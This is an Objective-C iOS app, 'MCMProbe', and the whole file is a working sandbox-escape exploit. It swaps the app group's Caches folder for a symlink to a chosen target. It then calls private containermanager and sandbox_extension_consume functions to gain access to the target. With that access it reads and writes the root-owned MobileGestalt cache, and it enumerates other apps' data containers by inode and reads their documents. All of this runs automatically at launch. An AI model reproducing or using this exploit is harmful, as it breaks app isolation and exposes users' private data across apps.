#import <UIKit/UIKit.h>
#import <Foundation/Foundation.h>
#import <Security/Security.h>
#import <sys/stat.h>
#import <sys/mount.h>
#import <sys/fsgetpath.h>
#import <dirent.h>
#import <fcntl.h>
#import <unistd.h>
#import <errno.h>
#import <dlfcn.h>
#import <string.h>

static NSMutableString *gLog; static NSString *gPath;
static void L(NSString *fmt, ...) {
    va_list ap; va_start(ap, fmt);
    NSString *s = [[NSString alloc] initWithFormat:fmt arguments:ap];
    va_end(ap);
    [gLog appendString:s]; [gLog appendString:@"\n"];
    [gLog writeToFile:gPath atomically:YES encoding:NSUTF8StringEncoding error:nil];
    NSLog(@"[mcmprobe] %@", s);
}

typedef void *XPCOBJ;
typedef XPCOBJ (*fn_xpcstr)(const char *);
typedef void (*fn_xpcrel)(XPCOBJ);
typedef void *(*fn_create)(void);
typedef void (*fn_u64)(void *, uint64_t);
typedef void (*fn_obj)(void *, XPCOBJ);
typedef void *(*fn_get1)(void *);
typedef const char *(*fn_path)(void *);
typedef char *(*fn_tok)(void *);
typedef void (*fn_free)(void *);
typedef int64_t (*fn_consume)(const char *);
static fn_create q_create; static fn_u64 q_class, q_part, q_flags;
static fn_obj q_gids, q_ids; static fn_get1 q_get1; static fn_path q_path;
static fn_tok q_token; static fn_free q_free; static fn_consume sb_consume;
static fn_xpcstr xpc_str; static fn_xpcrel xpc_rel;

static NSString *group_id(void) {
    CFTypeRef t = SecTaskCreateFromSelf(kCFAllocatorDefault);
    NSString *gid = nil;
    if (t) {
        CFTypeRef v = SecTaskCopyValueForEntitlement(t, CFSTR("com.apple.security.application-groups"), NULL);
        if (v && CFGetTypeID(v) == CFArrayGetTypeID()) {
            CFArrayRef a = (CFArrayRef)v;
            for (CFIndex i = 0; i < CFArrayGetCount(a); i++) {
                CFTypeRef x = CFArrayGetValueAtIndex(a, i);
                if (x && CFGetTypeID(x) == CFStringGetTypeID()) { gid = [(__bridge NSString *)x copy]; break; }
            }
        }
        if (v) CFRelease(v);
        CFRelease(t);
    }
    return gid;
}
static NSString *group_root(NSString *gid) {
    NSURL *u = [[NSFileManager defaultManager] containerURLForSecurityApplicationGroupIdentifier:gid];
    return u.path;
}
static void load_mcm(void) {
    void *h = dlopen("/usr/lib/system/libsystem_containermanager.dylib", RTLD_NOW|RTLD_LOCAL);
    L(@"[mcm] dlopen=%p %s", h, h ? "ok" : dlerror());
    if (!h) return;
    q_create = dlsym(h, "container_query_create");
    q_class = dlsym(h, "container_query_set_class");
    q_gids = dlsym(h, "container_query_set_group_identifiers");
    q_ids = dlsym(h, "container_query_set_identifiers");
    q_part = dlsym(h, "container_query_operation_set_part");
    q_flags = dlsym(h, "container_query_operation_set_flags");
    q_get1 = dlsym(h, "container_query_get_single_result");
    q_path = dlsym(h, "container_object_get_path");
    q_token = dlsym(h, "container_copy_sandbox_token");
    q_free = dlsym(h, "container_query_free");
    sb_consume = dlsym(RTLD_DEFAULT, "sandbox_extension_consume");
    void *xh = dlopen("/usr/lib/system/libxpc.dylib", RTLD_NOW|RTLD_LOCAL);
    xpc_str = dlsym(xh, "xpc_string_create");
    xpc_rel = dlsym(xh, "xpc_release");
    L(@"[mcm] create=%p class=%p gids=%p part=%p flags=%p get1=%p path=%p tok=%p free=%p consume=%p xpc=%p",
      q_create,q_class,q_gids,q_part,q_flags,q_get1,q_path,q_token,q_free,sb_consume,xpc_str);
}
static int64_t escape_to(NSString *target, NSString **linkOut) {
    NSString *gid = group_id();
    NSString *groot = gid ? group_root(gid) : nil;
    L(@"[esc] gid=%@ root=%@ target=%@", gid ?: @"(none)", groot ?: @"(none)", target);
    if (!gid.length || !groot.length || !q_create) return -6;
    NSFileManager *fm = [NSFileManager defaultManager];
    NSString *lib = [groot stringByAppendingPathComponent:@"Library"];
    NSString *caches = [lib stringByAppendingPathComponent:@"Caches"];
    NSString *bak = [lib stringByAppendingPathComponent:@"Caches.bqtool"];
    [fm createDirectoryAtPath:lib withIntermediateDirectories:YES attributes:nil error:nil];
    if ([fm fileExistsAtPath:bak]) { [fm removeItemAtPath:caches error:nil]; [fm moveItemAtPath:bak toPath:caches error:nil]; }
    if ([fm fileExistsAtPath:caches]) {
        if (![fm moveItemAtPath:caches toPath:bak error:nil]) { L(@"[esc] backup move failed"); return -2; }
    }
    unlink(caches.fileSystemRepresentation);
    int r = symlink(target.fileSystemRepresentation, caches.fileSystemRepresentation);
    L(@"[esc] symlink -> %d errno=%d", r, errno);
    if (r != 0) { if ([fm fileExistsAtPath:bak]) [fm moveItemAtPath:bak toPath:caches error:nil]; return -2; }
    void *q = q_create();
    q_class(q, 7);
    XPCOBJ x = xpc_str(gid.UTF8String);
    q_gids(q, x);
    q_part(q, 3);
    q_flags(q, 0x8100000000ULL);
    void *res = q_get1(q);
    NSString *p = nil; if (res && q_path) { const char *cp = q_path(res); if (cp) p = @(cp); }
    char *tok = res ? q_token(res) : NULL;
    int64_t h = (tok && sb_consume) ? sb_consume(tok) : -5;
    L(@"[esc] res=%p path=%@ token=%s consume=%lld", res, p ?: @"(null)", tok?"YES":"NO", (long long)h);
    if (tok) free(tok);
    q_free(q);
    if (x && xpc_rel) xpc_rel(x);
    [fm removeItemAtPath:caches error:nil];
    if ([fm fileExistsAtPath:bak]) [fm moveItemAtPath:bak toPath:caches error:nil];
    else [fm createDirectoryAtPath:caches withIntermediateDirectories:YES attributes:nil error:nil];
    if (h >= 0 && linkOut) *linkOut = caches;
    return h;
}
static void dump_dir(NSString *path, int max) {
    NSFileManager *fm = [NSFileManager defaultManager];
    NSError *e = nil;
    NSArray *a = [fm contentsOfDirectoryAtPath:path error:&e];
    L(@"[dir] %@ -> %lu %@", path, (unsigned long)a.count, e ?: @"");
    int n = 0;
    for (NSString *s in a) { L(@"[dir]   %@", s); if (++n >= max) break; }
}
static void run(void) {
    L(@"=== MCMProbe start ===");
    load_mcm();
    NSString *gid = group_id();
    L(@"[ent] group=%@", gid ?: @"(none)");
    if (gid) L(@"[ent] root=%@", group_root(gid) ?: @"(none)");

    // 1. MobileGestalt system group cache (system data, root-owned container).
    NSString *mg = @"/private/var/containers/Shared/SystemGroup/systemgroup.com.apple.mobilegestaltcache/Library/Caches";
    NSString *link = nil;
    int64_t h = escape_to(mg, &link);
    L(@"[mg] escape=%lld", (long long)h);
    if (h >= 0) {
        NSString *plist = [mg stringByAppendingPathComponent:@"com.apple.MobileGestalt.plist"];
        NSData *d = [NSData dataWithContentsOfFile:plist];
        L(@"[mg] plist bytes=%lu", (unsigned long)d.length);
        if (d.length) {
            NSMutableString *hex = [NSMutableString string];
            const uint8_t *b = d.bytes;
            for (NSUInteger i = 0; i < MIN((NSUInteger)32, d.length); i++) [hex appendFormat:@"%02x ", b[i]];
            L(@"[mg] head=%@", hex);
            id pl = [NSPropertyListSerialization propertyListWithData:d options:0 format:NULL error:nil];
            if ([pl isKindOfClass:[NSDictionary class]]) {
                NSDictionary *di = pl[@"CacheExtra"];
                L(@"[mg] cacheExtra keys=%lu", (unsigned long)[di count]);
            }
        }
        NSString *marker = [mg stringByAppendingPathComponent:@"kamui_probe_marker.txt"];
        NSString *s = @"mcm class7 symlink ok\n";
        BOOL w = [s writeToFile:marker atomically:YES encoding:NSUTF8StringEncoding error:nil];
        NSString *rb = [NSString stringWithContentsOfFile:marker encoding:NSUTF8StringEncoding error:nil];
        unlink(marker.fileSystemRepresentation);
        L(@"[mg] marker write=%d read=%@", w, rb ?: @"(null)");
    }

    // 2. Enumerate Application containers by inode and read one file from another app.
    struct statfs sfs; NSString *root = @"/var/mobile/Containers/Data/Application";
    NSMutableArray *found = [NSMutableArray array];
    if (statfs(root.fileSystemRepresentation, &sfs) == 0) {
        fsid_t fsid = sfs.f_fsid;
        char buf[1200];
        for (uint64_t ino = 1; ino <= 400000 && found.count < 60; ino++) {
            ssize_t n = fsgetpath(buf, sizeof(buf), &fsid, ino);
            if (n <= 0) continue;
            const char *p = buf;
            if (strncmp(p, "/private/var/", 13) == 0) p += 8;
            if (strncmp(p, root.fileSystemRepresentation, root.length) != 0) continue;
            if (strchr(p + root.length + 1, '/')) continue;
            [found addObject:@(p)];
        }
    }
    L(@"[apps] found=%lu", (unsigned long)found.count);
    int done = 0;
    for (NSString *c in found) {
        if (done >= 4) break;
        NSString *lk = nil;
        int64_t e = escape_to(c, &lk);
        if (e < 0) { L(@"[apps] escape %@ -> %lld", c, (long long)e); continue; }
        NSString *docs = [c stringByAppendingPathComponent:@"Documents"];
        NSArray *names = [[NSFileManager defaultManager] contentsOfDirectoryAtPath:docs error:nil];
        L(@"[apps] %@ -> %lu files", c.lastPathComponent, (unsigned long)names.count);
        for (NSString *nm in names) {
            NSString *fp = [docs stringByAppendingPathComponent:nm];
            NSDictionary *at = [[NSFileManager defaultManager] attributesOfItemAtPath:fp error:nil];
            L(@"[apps]   %@ size=%@", nm, at[NSFileSize] ?: @"?");
            if ([at[NSFileSize] unsignedLongLongValue] > 0 && [at[NSFileSize] unsignedLongLongValue] < 4096) {
                NSData *dd = [NSData dataWithContentsOfFile:fp];
                if (dd.length) {
                    NSMutableString *hex = [NSMutableString string];
                    for (NSUInteger i = 0; i < MIN((NSUInteger)32, dd.length); i++) [hex appendFormat:@"%02x ", ((const uint8_t*)dd.bytes)[i]];
                    L(@"[apps]   head=%@", hex);
                    break;
                }
            }
        }
        done++;
    }
    L(@"=== done ===");
}
@interface AppDelegate : UIResponder <UIApplicationDelegate>
@property (strong, nonatomic) UIWindow *window;
@end
@implementation AppDelegate
- (BOOL)application:(UIApplication *)app didFinishLaunchingWithOptions:(NSDictionary *)opts {
    self.window = [[UIWindow alloc] initWithFrame:[UIScreen mainScreen].bounds];
    UIViewController *vc = [UIViewController new]; vc.view.backgroundColor = UIColor.blackColor;
    UITextView *tv = [[UITextView alloc] initWithFrame:vc.view.bounds];
    tv.backgroundColor = UIColor.blackColor; tv.textColor = UIColor.greenColor;
    tv.font = [UIFont monospacedSystemFontOfSize:9 weight:UIFontWeightRegular];
    tv.editable = NO; tv.text = @"MCMProbe\n";
    [vc.view addSubview:tv]; self.window.rootViewController = vc; [self.window makeKeyAndVisible];
    [UIApplication sharedApplication].idleTimerDisabled = YES;
    dispatch_async(dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_HIGH, 0), ^{
        NSString *docs = [NSSearchPathForDirectoriesInDomains(NSDocumentDirectory, NSUserDomainMask, YES) firstObject];
        gPath = [docs stringByAppendingPathComponent:@"mcm.log"];
        gLog = [NSMutableString new]; run();
        dispatch_async(dispatch_get_main_queue(), ^{ tv.text = gLog; });
    });
    return YES;
}
@end
int main(int argc, char **argv) { @autoreleasepool { return UIApplicationMain(argc, argv, nil, NSStringFromClass([AppDelegate class])); } }
